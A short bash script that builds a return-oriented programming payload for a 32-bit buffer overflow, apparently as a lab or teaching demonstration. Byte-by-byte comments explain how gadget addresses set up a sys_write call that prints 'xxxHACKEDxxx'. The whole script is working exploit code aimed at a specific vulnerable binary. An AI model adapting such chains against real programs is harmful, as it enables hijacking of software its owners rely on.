#!/bin/bash

# write garbage to buff
perl -e 'print "XXXX";'

# overwrite saved EBP
perl -e 'print "XXXX";'

# jump to "pop %eax; ret"
perl -e 'print "\x35\x84\x04\x08";'
# value to be popped to %eax: 4, sys_write
perl -e 'print "\x04\x00\x00\x00";'

# jump to "pop %ebx; ret"
perl -e 'print "\x37\x84\x04\x08";'
# value to be popped to %ebx: 1, stdout
perl -e 'print "\x01\x00\x00\x00";'

# jump to "leal 12(%esp), %ecx; ret"
# %esp+20 is the location of the injected message
perl -e 'print "\x39\x84\x04\x08";'

# jump to "pop %edx; ret"
perl -e 'print "\x3e\x84\x04\x08";'
# value to be popped to %edx: 13, lenght of the message
perl -e 'print "\x0d\x00\x00\x00";'

# jump to "int 0x80"
perl -e 'print "\x40\x84\x04\x08";'

# write message out
perl -e 'print "xxxHACKEDxxx";'

